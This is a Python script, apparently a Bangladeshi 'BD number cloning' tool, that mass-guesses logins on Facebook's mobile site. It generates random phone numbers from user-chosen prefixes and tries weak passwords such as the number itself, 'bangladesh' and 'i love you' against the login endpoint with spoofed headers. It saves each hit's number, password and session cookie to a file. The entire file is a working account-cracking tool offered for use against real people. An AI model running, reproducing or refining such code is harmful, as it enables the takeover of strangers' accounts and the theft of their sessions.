import os, time, sys, uuid, random, requests

# কালার কোড
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
W = '\033[1;37m' # White
O = '\033[1;38;5;208m' # Orange

def banner():
    os.system('clear')
    print(f"""
{R}                ███    ███  ███████  ████████  █████  
{G}                ████  ████  ██          ██    ██   ██ 
{Y}                ██ ████ ██  █████       ██    ███████ 
{B}                ██  ██  ██  ██          ██    ██   ██ 
{P}                ██      ██  ███████     ██    ██   ██ 
    """)
    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
    print(line)
    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
    print(f'{G}| [✓] TEAM         : CYBER STRIKER TEAM        |')
    print(line)

def main():
    banner()
    print(f'{G}[1] BD NUMBER CLONING (REAL)')
    print(f'[0] EXIT')
    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else:
        sys.exit()

def cloning_start():
    banner()
    print(f'{R}[•] {G}BD CODE- -> {G}016 {G}017 {G}018 {G}019{W}')
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    print(f'{R}[•] {G}EXAMPLE : [ {Y}500{G}, {O}1000{G}, {G}5000 {G}]{W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    os.system('clear')
    banner()
    print(f'{G}[+] TARGET CODE: {code}')
    print(f'[+] TOTAL TARGET: {limit}')
    print(f'[+] REAL CLONING STARTED...')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    ok = 0
    for i in range(limit):
        loop = i + 1
        # আপনার দেওয়া সেই রিয়েল আইডি জেনারেশন লজিক
        user = str(random.randint(1111111, 9999999))
        uid = code + user
        
        # পাসওয়ার্ড ট্রাই করার রিয়েল লজিক
        pws = [user, uid, '778899', 'bangladesh', 'Bangladesh', 'i love you']

        for pw in pws:
            # মেন্টরের দেওয়া শক্তিশালী হেডার
            headers = {
                'authority': 'touch.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://touch.facebook.com',
                'referer': 'https://touch.facebook.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            }

            # মেন্টরের নির্দেশিত Response Logic ডাটা
            data = {
                'lsd': uuid.uuid4().hex,
                'jazoest': str(random.randint(2000, 3000)),
                'm_ts': str(int(time.time())),
                'li': uuid.uuid4().hex[:8],
                'email': uid,
                'pass': pw,
                'login': 'Log In'
            }
            
            # মেন্টরের দেওয়া স্পেশাল ইউআরএল
            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            
            sys.stdout.write(f'\r{G}      {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()

            try:
                response = requests.post(url, headers=headers, data=data, timeout=7)
                
                # যদি আইডিটি বাস্তবে লগইন হয়, তবেই কুকি পাওয়া যাবে
                if "c_user" in response.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in response.cookies.get_dict().items()])
                    print(f'\n{G}[MALEK-OK💚] {uid} • {pw}') 
                    print(f'{G}[🌺] COOKIE = {cookie}\n')
                    with open('/sdcard/MALEK-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pw}|{cookie}\n')
                    break # পাসওয়ার্ড মিলে গেলে পরের আইডিতে চলে যাবে
            except:
                pass

    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    print(f'{G}[+] CRACK COMPLETED. TOTAL OK: {ok}')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
    input(f'\n{G} [ BACK ]{W}')
    main()

if __name__ == "__main__":
    main()
